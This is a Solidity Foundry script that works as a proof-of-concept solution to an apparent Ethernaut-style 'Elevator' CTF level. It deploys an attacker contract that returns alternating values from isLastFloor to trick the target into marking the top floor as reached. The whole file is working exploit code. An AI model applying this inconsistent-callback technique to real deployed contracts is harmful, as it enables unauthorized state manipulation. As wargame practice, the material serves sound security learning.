// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../src/level11.sol";

contract POC is Script {
    Elevator level11 = Elevator(0xB21290C4d212c80cC1D8da8e6ce5511f93fEcafe);
    ElevatorAttacker attacker =
        ElevatorAttacker(0x23a510d772436B0aC3FAAcc7b9575F0a47b4259A);

    function run() external {
        vm.startBroadcast();

        level11.top();
        attacker.exploit();
        level11.top();

        vm.stopBroadcast();
    }
}

contract ElevatorAttacker {
    address elevator;
    uint256 public count;

    constructor(address _elevator) public {
        elevator = _elevator;
    }

    function exploit() public {
        address(elevator).call(abi.encodeWithSignature("goTo(uint256)", 1));
    }

    function isLastFloor(uint256) public returns (bool) {
        if (count % 2 == 0) {
            count++;
            return false;
        } else {
            count++;
            return true;
        }
    }
}
